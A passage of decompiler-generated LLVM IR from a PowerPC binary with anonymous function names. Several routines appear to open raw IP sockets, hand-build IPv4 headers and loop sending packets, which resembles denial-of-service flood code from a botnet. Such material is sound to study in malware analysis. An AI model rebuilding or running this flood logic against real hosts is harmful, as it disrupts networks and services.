  store i32 268443832, i32* @lr, align 4
  %v6_100020b4 = call i32 @function_10007c3c(i32 %v3_10001e3c, i32 %v2_10001ee0, i32 1500, i32 0, i32 %v2_10002094, i32 16)
  %tmp34 = icmp ult i32 %stack_var_-1560.0, 50
  br i1 %tmp34, label %dec_label_pc_100020f8, label %dec_label_pc_100020c4

dec_label_pc_100020c4:                            ; preds = %dec_label_pc_10002028
  store i32 268443852, i32* @lr, align 4
  %v1_100020c8 = call i32 @function_10004a90(i32 0)
  %v2_100020e0 = icmp ult i32 %v1_100020c8, %v2_100020dc
  br i1 %v2_100020e0, label %dec_label_pc_100020f0, label %dec_label_pc_100020e8

dec_label_pc_100020e8:                            ; preds = %dec_label_pc_100020c4
  %v0_100020ec = call i32 @function_10008858()
  br label %dec_label_pc_100020f0

dec_label_pc_100020f0:                            ; preds = %dec_label_pc_100020c4, %dec_label_pc_100020e8
  br label %dec_label_pc_100020f8

dec_label_pc_100020f8:                            ; preds = %dec_label_pc_10002028, %dec_label_pc_100020f0
  %stack_var_-1560.1 = phi i32 [ %stack_var_-1560.0, %dec_label_pc_10002028 ], [ 0, %dec_label_pc_100020f0 ]
  %v1_100020fc = add i32 %stack_var_-1560.1, 1
  br label %dec_label_pc_10001fd4

dec_label_pc_10002108:                            ; preds = %dec_label_pc_10001de0
  ret i32 %v1_10001e20

; uselistorder directives
  uselistorder i32 %v1_10001ff8, { 1, 0 }
  uselistorder i32 %v1_10001fac, { 1, 0 }
  uselistorder i32 %v2_10001ee0, { 9, 2, 3, 4, 5, 6, 7, 8, 0, 1 }
  uselistorder i32* %stack_var_-1536, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-1552, { 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100020f8, { 1, 0 }
  uselistorder label %dec_label_pc_100020f0, { 1, 0 }
  uselistorder label %dec_label_pc_10002028, { 1, 0 }
  uselistorder label %dec_label_pc_10001e88, { 1, 0 }
  uselistorder label %dec_label_pc_10001e5c, { 1, 0 }
}

define i32 @function_10002120(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10002120:
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-220 = alloca i32, align 4
  %stack_var_-240 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %v2_1000214c = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v2_1000214c, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1000d3ac.83 to i32), i32* @r4, align 4
  store i32 80, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_10002164.84 to i32), i32* @lr, align 4
  %v0_10002160 = call i32 @function_10006d88()
  store i32 268444028, i32* @lr, align 4
  %v1_10002178 = call i32 @function_10004a90(i32 0)
  %v1_10002188 = call i32 @function_100004f0(i32 %arg2)
  %v3_10002190 = icmp eq i32 %v1_10002188, 0
  br i1 %v3_10002190, label %dec_label_pc_10002198, label %dec_label_pc_10002608

dec_label_pc_10002198:                            ; preds = %dec_label_pc_10002120
  %v2_1000219c = icmp sgt i32 %arg3, 2
  br i1 %v2_1000219c, label %dec_label_pc_100021c4, label %dec_label_pc_100021a4

dec_label_pc_100021a4:                            ; preds = %dec_label_pc_10002198
  %v5_100021b8 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_1000d3fc.85 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v0_100021c0 = call i32 @function_10008858()
  br label %dec_label_pc_100021c4

dec_label_pc_100021c4:                            ; preds = %dec_label_pc_10002198, %dec_label_pc_100021a4
  store i32 268444116, i32* @lr, align 4
  %v3_100021d0 = call i32 @function_10007cb8(i32 2, i32 3, i32 255)
  %tmp71 = icmp sgt i32 %v3_100021d0, -1
  br i1 %tmp71, label %dec_label_pc_10002234.preheader, label %dec_label_pc_100021e8

dec_label_pc_100021e8:                            ; preds = %dec_label_pc_100021c4
  %v0_100021ec = call i32 @function_10008858()
  br label %dec_label_pc_10002234.preheader

dec_label_pc_10002234.preheader:                  ; preds = %dec_label_pc_100021c4, %dec_label_pc_100021e8
  store i32 0, i32* %stack_var_-280, align 4
  %v2_10002208 = ptrtoint i32* %stack_var_-280 to i32
  %v2_1000220c = add i32 %v2_10002208, 168
  %v2_10002220 = add i32 %v2_10002208, 80
  br label %dec_label_pc_100021fc

dec_label_pc_100021fc:                            ; preds = %dec_label_pc_10002234.preheader, %dec_label_pc_100021fc
  %v3_100021fc = phi i32 [ 0, %dec_label_pc_10002234.preheader ], [ %v1_1000222c, %dec_label_pc_100021fc ]
  %v1_10002204 = mul i32 %v3_100021fc, 4
  %v1_10002210 = add i32 %v2_1000220c, %v1_10002204
  %v1_10002214 = inttoptr i32 %v1_10002210 to i32*
  %v2_10002214 = load i32, i32* %v1_10002214, align 4
  %v1_10002224 = trunc i32 %v2_10002214 to i8
  %v3_10002224 = add i32 %v2_10002220, %v3_100021fc
  %v4_10002224 = inttoptr i32 %v3_10002224 to i8*
  store i8 %v1_10002224, i8* %v4_10002224, align 1
  %v3_10002228 = load i32, i32* %stack_var_-280, align 4
  %v1_1000222c = add i32 %v3_10002228, 1
  store i32 %v1_1000222c, i32* %stack_var_-280, align 4
  %tmp72 = icmp slt i32 %v1_1000222c, 20
  br i1 %tmp72, label %dec_label_pc_100021fc, label %dec_label_pc_10002240

dec_label_pc_10002240:                            ; preds = %dec_label_pc_100021fc
  %v1_10002244 = add i32 %arg4, 4
  %v1_10002248 = inttoptr i32 %v1_10002244 to i32*
  %v2_10002248 = load i32, i32* %v1_10002248, align 4
  store i32 268444248, i32* @lr, align 4
  %v3_10002254 = call i32 @function_10001d04(i32 %arg2, i32 %v2_10002248, i32 %v1_10002244)
  %v1_10002264 = add i32 %arg4, 12
  %v1_10002268 = inttoptr i32 %v1_10002264 to i32*
  %v2_10002268 = load i32, i32* %v1_10002268, align 4
  store i32 268444276, i32* @lr, align 4
  %v2_10002270 = inttoptr i32 %v2_10002268 to i8*
  %v3_10002270 = call i32 @function_10008690(i8* %v2_10002270, i32 %v1_10002264)
  %v2_10002284 = load i32, i32* %v1_10002248, align 4
  %v6_100022a0 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_1000d424.89 to i32), i32 %arg2, i32 %v2_10002284)
  %v1_100022ac = call i32 @__asm_rlwimi(i32 5, i32 28, i32 0, i32 3)
  %v1_100022bc = call i32 @__asm_rlwimi(i32 4, i32 24, i32 4, i32 7)
  store i32 %v1_100022bc, i32* %stack_var_-240, align 4
  %v1_100022f4 = call i32 @__asm_rlwimi(i32 10, i32 24, i32 4, i32 7)
  %v1_10002304 = call i32 @__asm_rlwimi(i32 0, i32 28, i32 0, i32 3)
  %v1_10002310 = call i32 @__asm_rlwinm(i32 %v1_10002304, i32 0, i32 16, i32 14)
  %v1_1000231c = call i32 @__asm_rlwinm(i32 %v1_10002310, i32 0, i32 15, i32 13)
  %v1_10002328 = call i32 @__asm_rlwinm(i32 %v1_1000231c, i32 0, i32 14, i32 12)
  %v1_10002334 = call i32 @__asm_rlwinm(i32 %v1_10002328, i32 0, i32 13, i32 11)
  %v1_10002340 = call i32 @__asm_rlwinm(i32 %v1_10002334, i32 0, i32 12, i32 10)
  %v1_1000234c = call i32 @__asm_rlwinm(i32 %v1_10002340, i32 0, i32 11, i32 9)
  %v1_10002358 = call i32 @__asm_rlwinm(i32 %v1_1000234c, i32 0, i32 9, i32 7)
  %v1_10002380 = add i32 %arg4, 8
  %v1_10002384 = inttoptr i32 %v1_10002380 to i32*
  %v2_10002384 = load i32, i32* %v1_10002384, align 4
  store i32 268444560, i32* @lr, align 4
  %v2_1000238c = inttoptr i32 %v2_10002384 to i8*
  %v3_1000238c = call i32 @function_10008690(i8* %v2_1000238c, i32 %v1_10002380)
  %v1_10002394 = urem i32 %v3_1000238c, 65536
  store i32 %v1_10002394, i32* @r3, align 4
  %v1_1000239c = call i32 @function_10007640(i32 %v1_10002394)
  %v2_1000247c = ptrtoint i32* %stack_var_-240 to i32
  %v2_10002488 = bitcast i32* %stack_var_-240 to i16*
  %v2_10002530 = ptrtoint i32* %stack_var_-220 to i32
  %v2_10002534 = ptrtoint i32* %stack_var_-180 to i32
  %v2_10002538 = ptrtoint i32* %stack_var_-168 to i32
  %v2_10002550 = ptrtoint i32* %stack_var_-200 to i32
  %v2_10002558 = ptrtoint i32* %stack_var_-148 to i32
  %v2_10002580 = bitcast i32* %stack_var_-180 to i16*
  %v2_10002594 = ptrtoint i32* %stack_var_-128 to i32
  %v2_100025dc = add i32 %v3_10002270, %v1_10002178
  br label %dec_label_pc_100023a8

dec_label_pc_100023a8:                            ; preds = %dec_label_pc_100025f8, %dec_label_pc_10002240
  %stack_var_-244.0 = phi i32 [ 0, %dec_label_pc_10002240 ], [ %v1_100025fc, %dec_label_pc_100025f8 ]
  store i32 268444588, i32* @lr, align 4
  %v0_100023a8 = call i32 @function_10008158()
  %v2_100023bc = load i32, i32* %v1_10002384, align 4
  store i32 268444616, i32* @lr, align 4
  %v2_100023c4 = inttoptr i32 %v2_100023bc to i8*
  %v3_100023c4 = call i32 @function_10008690(i8* %v2_100023c4, i32 %v1_10002380)
  %v3_100023cc = icmp eq i32 %v3_100023c4, 0
  br i1 %v3_100023cc, label %dec_label_pc_100023d4, label %dec_label_pc_100023e0

dec_label_pc_100023d4:                            ; preds = %dec_label_pc_100023a8
  store i32 268444632, i32* @lr, align 4
  %v0_100023d4 = call i32 @function_10008158()
  br label %dec_label_pc_100023e0

dec_label_pc_100023e0:                            ; preds = %dec_label_pc_100023a8, %dec_label_pc_100023d4
  %v0_100023e0 = call i32 @function_1000066c()
  store i32 60, i32* @r3, align 4
  %v1_10002400 = call i32 @function_10007640(i32 60)
  store i32 268444688, i32* @lr, align 4
  %v0_1000240c = call i32 @function_10008158()
  %v1_10002438 = urem i32 %v0_100023a8, 65536
  store i32 %v1_10002438, i32* %stack_var_-220, align 4
  store i32 268444752, i32* @lr, align 4
  %v0_1000244c = call i32 @function_10008158()
  store i32 2, i32* %stack_var_-128, align 4
  %v3_10002488 = call i32 @function_10000e28(i16* %v2_10002488, i32 20)
  store i32 268444824, i32* @lr, align 4
  %v0_10002494 = call i32 @function_10008158()
  store i32 %v0_100023e0, i32* %stack_var_-180, align 4
  store i32 40, i32* @r3, align 4
  %v1_10002520 = call i32 @function_10007640(i32 40)
  store i32 20, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000254c.90 to i32), i32* @lr, align 4
  %v4_10002548 = call i32 @function_1000734c(i32 %v2_10002530, i32 %v2_10002538, i32 20, i32 %v2_10002534)
  store i32 20, i32* @r5, align 4
  store i32 268445036, i32* @lr, align 4
  %v4_10002568 = call i32 @function_1000734c(i32 %v2_10002550, i32 %v2_10002558, i32 20, i32 %v2_10002534)
  %v3_10002580 = call i32 @function_10000e28(i16* %v2_10002580, i32 52)
  store i32 268445112, i32* @lr, align 4
  %v6_100025b4 = call i32 @function_10007c3c(i32 %v3_100021d0, i32 %v2_1000247c, i32 60, i32 0, i32 %v2_10002594, i32 16)
  %tmp73 = icmp ult i32 %stack_var_-244.0, 50
  br i1 %tmp73, label %dec_label_pc_100025f8, label %dec_label_pc_100025c4

dec_label_pc_100025c4:                            ; preds = %dec_label_pc_100023e0
  store i32 268445132, i32* @lr, align 4
  %v1_100025c8 = call i32 @function_10004a90(i32 0)
  %v2_100025e0 = icmp ult i32 %v1_100025c8, %v2_100025dc
  br i1 %v2_100025e0, label %dec_label_pc_100025f0, label %dec_label_pc_100025e8

dec_label_pc_100025e8:                            ; preds = %dec_label_pc_100025c4
  %v0_100025ec = call i32 @function_10008858()
  br label %dec_label_pc_100025f0

dec_label_pc_100025f0:                            ; preds = %dec_label_pc_100025c4, %dec_label_pc_100025e8
  br label %dec_label_pc_100025f8

dec_label_pc_100025f8:                            ; preds = %dec_label_pc_100023e0, %dec_label_pc_100025f0
  %stack_var_-244.1 = phi i32 [ %stack_var_-244.0, %dec_label_pc_100023e0 ], [ 0, %dec_label_pc_100025f0 ]
  %v1_100025fc = add i32 %stack_var_-244.1, 1
  br label %dec_label_pc_100023a8

dec_label_pc_10002608:                            ; preds = %dec_label_pc_10002120
  ret i32 %v1_10002188

; uselistorder directives
  uselistorder i32 %v2_10002534, { 1, 0 }
  uselistorder i32 %v1_10002394, { 1, 0 }
  uselistorder i32 %v1_1000222c, { 1, 2, 0 }
  uselistorder i32 %v3_100021fc, { 1, 0 }
  uselistorder i32* %stack_var_-280, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-240, { 0, 2, 1 }
  uselistorder i32* %stack_var_-180, { 1, 0, 2 }
  uselistorder i32 60, { 2, 4, 3, 6, 1, 7, 8, 0, 5 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100025f8, { 1, 0 }
  uselistorder label %dec_label_pc_100025f0, { 1, 0 }
  uselistorder label %dec_label_pc_100023e0, { 1, 0 }
  uselistorder label %dec_label_pc_100021fc, { 1, 0 }
  uselistorder label %dec_label_pc_10002234.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_100021c4, { 1, 0 }
}

define i32 @function_10002620(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_10002620:
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  store i32 268445272, i32* @lr, align 4
  %v1_10002654 = call i32 @function_10004a90(i32 0)
  %v1_10002664 = call i32 @function_100004f0(i32 %arg2)
  %v3_1000266c = icmp eq i32 %v1_10002664, 0
  br i1 %v3_1000266c, label %dec_label_pc_10002674, label %dec_label_pc_10002a44

dec_label_pc_10002674:                            ; preds = %dec_label_pc_10002620
  %v2_10002678 = icmp sgt i32 %arg3, 1
  br i1 %v2_10002678, label %dec_label_pc_100026a0, label %dec_label_pc_10002680

dec_label_pc_10002680:                            ; preds = %dec_label_pc_10002674
  %v5_10002694 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_1000d43c.92 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v0_1000269c = call i32 @function_10008858()
  br label %dec_label_pc_100026a0

dec_label_pc_100026a0:                            ; preds = %dec_label_pc_10002674, %dec_label_pc_10002680
  %v1_100026a4 = add i32 %arg4, 8
  %v1_100026a8 = inttoptr i32 %v1_100026a4 to i32*
  %v2_100026a8 = load i32, i32* %v1_100026a8, align 4
  store i32 268445364, i32* @lr, align 4
  %v2_100026b0 = inttoptr i32 %v2_100026a8 to i8*
  %v3_100026b0 = call i32 @function_10008690(i8* %v2_100026b0, i32 %v1_100026a4)
  store i32 268445388, i32* @lr, align 4
  %v3_100026c8 = call i32 @function_10007cb8(i32 2, i32 3, i32 255)
  %tmp60 = icmp sgt i32 %v3_100026c8, -1
  br i1 %tmp60, label %dec_label_pc_100026e8, label %dec_label_pc_100026e0

dec_label_pc_100026e0:                            ; preds = %dec_label_pc_100026a0
  %v0_100026e4 = call i32 @function_10008858()
  br label %dec_label_pc_100026e8

dec_label_pc_100026e8:                            ; preds = %dec_label_pc_100026a0, %dec_label_pc_100026e0
  store i32 268445424, i32* @lr, align 4
  %v1_100026ec = call i32 @function_10004a90(i32 0)
  store i32 268445432, i32* @lr, align 4
  %v0_100026f4 = call i32 @function_10004970()
  %v2_100026fc = xor i32 %v1_100026ec, %v0_100026f4
  store i32 ptrtoint (i32* @global_var_10002708.95 to i32), i32* @lr, align 4
  %v1_10002704 = call i32 @function_100082d4(i32 %v2_100026fc)
  store i32 268445452, i32* @lr, align 4
  %v0_10002708 = call i32 @function_10008158()
  %v2_10002710 = ptrtoint i32* %stack_var_-168 to i32
  %v2_10002714 = ptrtoint i32* %stack_var_-128 to i32
  store i32 268445480, i32* @lr, align 4
  %v3_10002724 = call i32 @function_10006e24(i32 %v2_10002714, i32 %v0_10002708, i32 1400)
  %v1_1000272c = add i32 %arg4, 4
  %v1_10002730 = inttoptr i32 %v1_1000272c to i32*
  %v2_10002730 = load i32, i32* %v1_10002730, align 4
  store i32 268445504, i32* @lr, align 4
  %v3_1000273c = call i32 @function_10001d04(i32 %arg2, i32 %v2_10002730, i32 %v1_1000272c)
  %v2_10002750 = load i32, i32* %v1_10002730, align 4
  %v6_1000276c = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_1000d460.96 to i32), i32 %arg2, i32 %v2_10002750)
  %v2_100028fc = bitcast i32* %stack_var_-168 to i16*
  %v2_10002964 = ptrtoint i32* %stack_var_-148 to i32
  %v2_10002968 = ptrtoint i32* %stack_var_-108 to i32
  %v2_1000296c = ptrtoint i32* %stack_var_-96 to i32
  %v2_1000298c = ptrtoint i32* %stack_var_-76 to i32
  %v2_100029b4 = bitcast i32* %stack_var_-108 to i16*
  %v2_100029c8 = ptrtoint i32* %stack_var_-56 to i32
  %v2_10002a10 = add i32 %v3_100026b0, %v1_10002654
  br label %dec_label_pc_10002770

dec_label_pc_10002770:                            ; preds = %dec_label_pc_10002a24, %dec_label_pc_100026e8
  %stack_var_-180.0 = phi i32 [ %tmp11, %dec_label_pc_100026e8 ], [ %v1_10002a28, %dec_label_pc_10002a24 ]
  %v0_10002770 = call i32 @function_1000066c()
  %v1_10002784 = call i32 @__asm_rlwimi(i32 5, i32 28, i32 0, i32 3)
  store i32 %v1_10002784, i32* %stack_var_-168, align 4
  %v1_10002794 = call i32 @__asm_rlwimi(i32 4, i32 24, i32 4, i32 7)
  store i32 %v1_10002794, i32* %stack_var_-168, align 4
  store i32 1440, i32* @r3, align 4
  %v1_100027b8 = call i32 @function_10007640(i32 1440)
  store i32 268445640, i32* @lr, align 4
  %v0_100027c4 = call i32 @function_10008158()
  store i32 268445704, i32* @lr, align 4
  %v0_10002804 = call i32 @function_10008158()
  %v1_1000280c = urem i32 %v0_10002804, 65536
  store i32 %v1_1000280c, i32* %stack_var_-148, align 4
  store i32 268445720, i32* @lr, align 4
  %v0_10002814 = call i32 @function_10008158()
  store i32 268445736, i32* @lr, align 4
  %v0_10002824 = call i32 @function_10008158()
  store i32 268445748, i32* @lr, align 4
  %v0_10002830 = call i32 @function_10008158()
  %v1_10002844 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  %v1_10002854 = call i32 @__asm_rlwimi(i32 0, i32 28, i32 0, i32 3)
  %v1_10002860 = call i32 @__asm_rlwinm(i32 %v1_10002854, i32 0, i32 16, i32 14)
  %v1_1000286c = call i32 @__asm_rlwinm(i32 %v1_10002860, i32 0, i32 15, i32 13)
  %v1_10002878 = call i32 @__asm_rlwinm(i32 %v1_1000286c, i32 0, i32 14, i32 12)
  %v1_10002890 = or i32 %v1_10002878, 1572864
  %v1_1000289c = call i32 @__asm_rlwinm(i32 %v1_10002890, i32 0, i32 11, i32 9)
  %v1_100028a8 = call i32 @__asm_rlwinm(i32 %v1_1000289c, i32 0, i32 9, i32 7)
  %v1_100028b4 = call i32 @__asm_rlwinm(i32 %v1_100028a8, i32 0, i32 10, i32 8)
  store i32 2, i32* %stack_var_-56, align 4
  %v3_100028fc = call i32 @function_10000e28(i16* %v2_100028fc, i32 20)
  %v3_10002914 = call i32 @function_10000e28(i16* %v2_100028fc, i32 40)
  store i32 %v0_10002770, i32* %stack_var_-108, align 4
  store i32 1420, i32* @r3, align 4
  %v1_10002954 = call i32 @function_10007640(i32 1420)
  store i32 20, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10002980.97 to i32), i32* @lr, align 4
  %v4_1000297c = call i32 @function_1000734c(i32 %v2_10002964, i32 %v2_1000296c, i32 20, i32 %v2_10002968)
  store i32 1400, i32* @r5, align 4
  store i32 268446112, i32* @lr, align 4
  %v4_1000299c = call i32 @function_1000734c(i32 %v2_10002714, i32 %v2_1000298c, i32 1400, i32 %v2_10002968)
  %v3_100029b4 = call i32 @function_10000e28(i16* %v2_100029b4, i32 1432)
  store i32 268446188, i32* @lr, align 4
  %v6_100029e8 = call i32 @function_10007c3c(i32 %v3_100026c8, i32 %v2_10002710, i32 1440, i32 0, i32 %v2_100029c8, i32 16)
  %tmp61 = icmp ult i32 %stack_var_-180.0, 50
  br i1 %tmp61, label %dec_label_pc_10002a24, label %dec_label_pc_100029f8

dec_label_pc_100029f8:                            ; preds = %dec_label_pc_10002770
  store i32 268446208, i32* @lr, align 4
  %v1_100029fc = call i32 @function_10004a90(i32 0)
  %v2_10002a14 = icmp ult i32 %v1_100029fc, %v2_10002a10
  br i1 %v2_10002a14, label %dec_label_pc_10002a1c, label %dec_label_pc_10002a34

dec_label_pc_10002a1c:                            ; preds = %dec_label_pc_100029f8
  br label %dec_label_pc_10002a24

dec_label_pc_10002a24:                            ; preds = %dec_label_pc_10002770, %dec_label_pc_10002a1c
  %stack_var_-180.1 = phi i32 [ %stack_var_-180.0, %dec_label_pc_10002770 ], [ 0, %dec_label_pc_10002a1c ]
  %v1_10002a28 = add i32 %stack_var_-180.1, 1
  br label %dec_label_pc_10002770

dec_label_pc_10002a34:                            ; preds = %dec_label_pc_100029f8
  store i32 ptrtoint ([3 x i8]* @global_var_10002a3c.98 to i32), i32* @lr, align 4
  %v1_10002a38 = call i32 @function_100048e0(i32 %v3_100026c8)
  %v0_10002a40 = call i32 @function_10008858()
  br label %dec_label_pc_10002a44

dec_label_pc_10002a44:                            ; preds = %dec_label_pc_10002620, %dec_label_pc_10002a34
  %v0_10002a5c = phi i32 [ %v1_10002664, %dec_label_pc_10002620 ], [ %v0_10002a40, %dec_label_pc_10002a34 ]
  ret i32 %v0_10002a5c

; uselistorder directives
  uselistorder i32 %v2_10002968, { 1, 0 }
  uselistorder i32 %v2_10002714, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-108, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_10007c3c, { 2, 1, 0 }
  uselistorder i32 1420, { 1, 0 }
  uselistorder i32 1440, { 0, 2, 1 }
  uselistorder i32 ()* @function_1000066c, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_10001d04, { 2, 1, 0 }
  uselistorder i32 1400, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_100004f0, { 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10002a44, { 1, 0 }
  uselistorder label %dec_label_pc_10002a24, { 1, 0 }
  uselistorder label %dec_label_pc_100026e8, { 1, 0 }
  uselistorder label %dec_label_pc_100026a0, { 1, 0 }
}

define i32 @function_100037d8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_100037d8:
  %v3_100037fc = load i32, i32* @global_var_10010474.145, align 4
  %v5_10003814 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_1000dc2c.158 to i32), i32 %v3_100037fc, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v3_1000381c = load i32, i32* @global_var_10010488.143, align 4
  %v3_10003824 = load i32, i32* @global_var_10010484.159, align 4
  %v6_10003840 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_1000dc3c.160 to i32), i32 %v3_1000381c, i32 %v3_10003824)
  %v3_10003848 = load i32, i32* @global_var_10010474.145, align 4
  %v5_10003860 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([8 x i8]* @global_var_1000dc4c.161 to i32), i32 %v3_10003848, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  ret i32 %v5_10003860
}

define i32 @function_1000387c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000387c:
  %v5_100038b0 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_1000dc54.162 to i32), i32 %arg3, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  ret i32 %v5_100038b0
}

define i32 @function_100038cc(i32 %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
dec_label_pc_100038cc:
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg3 to i32
  %stack_var_-56 = alloca i8, align 1
  %stack_var_-80 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_100038cc = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_100038cc, i32* %stack_var_-80, align 4
  br label %dec_label_pc_10003924.preheader

dec_label_pc_1000390c:                            ; preds = %dec_label_pc_1000393c
  %v4_1000393c = ptrtoint i8* %stack_var_-68.057 to i32
  %v1_10003910 = add i32 %v4_1000393c, 1
  %v5_10003914 = inttoptr i32 %v1_10003910 to i8*
  %v1_1000391c = add i32 %stack_var_-60.056, 1
  store i32 %v1_1000391c, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_1000392c = call i32 @function_10006ed4()
  %v0_10003934 = load i32, i32* %r29.global-to-local, align 4
  %v2_10003934 = icmp ult i32 %v0_10003934, %v0_1000392c
  br i1 %v2_10003934, label %dec_label_pc_1000393c, label %dec_label_pc_10003950

dec_label_pc_1000393c:                            ; preds = %dec_label_pc_10003924.preheader, %dec_label_pc_1000390c
  %stack_var_-68.057 = phi i8* [ %v5_10003914, %dec_label_pc_1000390c ], [ %stack_var_-68.163, %dec_label_pc_10003924.preheader ]
  %stack_var_-60.056 = phi i32 [ %v1_1000391c, %dec_label_pc_1000390c ], [ %stack_var_-60.162, %dec_label_pc_10003924.preheader ]
  %v2_10003940 = load i8, i8* %stack_var_-68.057, align 1
  %v3_10003948 = icmp eq i8 %v2_10003940, 32
  br i1 %v3_10003948, label %dec_label_pc_10003950, label %dec_label_pc_1000390c

dec_label_pc_10003950:                            ; preds = %dec_label_pc_1000390c, %dec_label_pc_1000393c, %dec_label_pc_10003924.preheader
  %stack_var_-60.0.lcssa = phi i32 [ %stack_var_-60.162, %dec_label_pc_10003924.preheader ], [ %v1_1000391c, %dec_label_pc_1000390c ], [ %stack_var_-60.056, %dec_label_pc_1000393c ]
  %stack_var_-68.0.lcssa = phi i8* [ %stack_var_-68.163, %dec_label_pc_10003924.preheader ], [ %v5_10003914, %dec_label_pc_1000390c ], [ %stack_var_-68.057, %dec_label_pc_1000393c ]
  %v4_10003950 = ptrtoint i8* %stack_var_-68.0.lcssa to i32
  %v1_10003954 = add i32 %v4_10003950, 1
  store i32 %stack_var_-60.0.lcssa, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10003964 = call i32 @function_10006ed4()
  %v0_1000396c = load i32, i32* %r29.global-to-local, align 4
  %v4_1000396c = icmp eq i32 %v0_1000396c, %v0_10003964
  br i1 %v4_1000396c, label %dec_label_pc_10003c2c, label %dec_label_pc_10003974

dec_label_pc_10003974:                            ; preds = %dec_label_pc_10003950
  %v5_10003958 = inttoptr i32 %v1_10003954 to i8*
  %v1_10003978 = add nuw nsw i32 %storemerge864, 1
  %tmp91 = icmp slt i32 %v1_10003978, 5
  br i1 %tmp91, label %dec_label_pc_10003924.preheader, label %dec_label_pc_100039a4.preheader

dec_label_pc_10003924.preheader:                  ; preds = %dec_label_pc_100038cc, %dec_label_pc_10003974
  %storemerge864 = phi i32 [ 0, %dec_label_pc_100038cc ], [ %v1_10003978, %dec_label_pc_10003974 ]
  %stack_var_-68.163 = phi i8* [ %arg3, %dec_label_pc_100038cc ], [ %v5_10003958, %dec_label_pc_10003974 ]
  %stack_var_-60.162 = phi i32 [ 0, %dec_label_pc_100038cc ], [ %stack_var_-60.0.lcssa, %dec_label_pc_10003974 ]
  store i32 %stack_var_-60.162, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_1000392c51 = call i32 @function_10006ed4()
  %v0_1000393452 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000393453 = icmp ult i32 %v0_1000393452, %v0_1000392c51
  br i1 %v2_1000393453, label %dec_label_pc_1000393c, label %dec_label_pc_10003950

dec_label_pc_100039a4.preheader:                  ; preds = %dec_label_pc_10003974
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v1_10003954, i32* @r3, align 4
  %v0_100039ac41 = call i32 @function_10006ed4()
  %v0_100039b442 = load i32, i32* %r29.global-to-local, align 4
  %v2_100039b443 = icmp ult i32 %v0_100039b442, %v0_100039ac41
  br i1 %v2_100039b443, label %dec_label_pc_100039bc, label %dec_label_pc_100039dc

dec_label_pc_10003998:                            ; preds = %dec_label_pc_100039bc
  %v1_1000399c = add i32 %storemerge946, 1
  store i32 %v1_1000399c, i32* %r29.global-to-local, align 4
  store i32 %v1_10003954, i32* @r3, align 4
  %v0_100039ac = call i32 @function_10006ed4()
  %v0_100039b4 = load i32, i32* %r29.global-to-local, align 4
  %v2_100039b4 = icmp ult i32 %v0_100039b4, %v0_100039ac
  br i1 %v2_100039b4, label %dec_label_pc_100039bc, label %dec_label_pc_100039dc

